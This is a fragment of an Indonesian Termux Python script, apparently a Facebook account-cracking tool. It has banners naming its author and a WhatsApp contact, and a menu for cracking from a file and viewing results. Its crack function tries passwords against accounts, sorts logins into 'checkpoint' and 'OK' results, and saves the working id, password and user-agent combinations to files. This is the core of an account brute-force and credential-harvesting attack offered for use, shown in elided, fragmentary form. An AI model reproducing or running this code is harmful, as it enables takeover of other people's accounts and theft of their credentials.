...
#THANKS TO DHANZ-XD >> TANKS TO ALVINO >> TANKS TO FANZ-XD
...
ADMIN : RISKI-XD WHATSAPP : 083136240169 •
• FB : RISKI X CODE•
.══════════════════════════════════════════════════════════════════════════════════════╗
...
│ ╭──────────────────────────────────────────────────────────────────────────────────╮ │
│ │                                                                                  │ │
│ │                •   STATUS : PRIBADI WHATSAPP : 083136240169•                 │ │
...
│ │                •                                               •                 │ │
│ │                •   GITHUB : HTTPS://GITHUB.COM/YANG PUNYA COKIS PM  •                 │ │
│ ╰──────────────────────────────────────────────────────────────────────────────────╯ │
╰──────────────────────────────────────────────────────────────────────────────────────╯
╭─────────────────────  • YANG INGIN MENGUNAKAN HUBUNGI RISKI•  ──────────────────────╮
│ ╭──────────────────────────────────────────────────────────────────────────────────╮ │
│ │ [S] STATUS FREEE                                                    │ │
│ │ [W] WHATSAPP : 083136240169                                               │ │
│ ╰──────────────────────────────────────────────────────────────────────────────────╯ │
╰──────────────────────────────────────────────────────────────────────────────────────╯
• MAY LOVE  : MELVI TRI YUSPA•
SEMOGA SAMPAI PELAMINAN
• GROUP : USER-SC-TERMUX-INDONESIA •

       {M2} CRACK TRUS YA SAYANG wkwkwk {M2}                                                 
      Made By {H2} RISMI-XD KANG RICODE{K2} ®asli ada badaknya
{color_text}╭──────────────────────╮{color_text}╭───────────────╮{color_text}╭────────────────────────────╮
{color_text}│{M2}RISKI-XD{color_text}│{color_text}│ {P2}Version : 2.0 {color_text}│{color_text}│{B2}It is strictly forbidden to use sc KIY{color_text} │
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=100,style=f"{domris}"))
...
%s{%s01%s} XD Konnichiwa
%s{%s02%s} XD DAME DAME
%s{%s03%s} XD Arigato
%s{%s04%s} Crack File
%s{%s05%s} Hasil Crack
...
def passwrd():
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}>>{k} Good Bye Dadaahh Jangan Lupa Bersukur{x} << ')
		time.sleep(2)
		exit()						
#--------------------[ METODE-Mobile ]-----------------#
def crack(idf,pwv):
...
'bi_xrwh': 0
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				tree.add(f"{K}╰─>{ua}\n")
				cetak(tree)
				open('KIY-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				tree.add(f"{H}╰─>{kuki}\n")
				cetak(tree) 
				open('KIY-OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
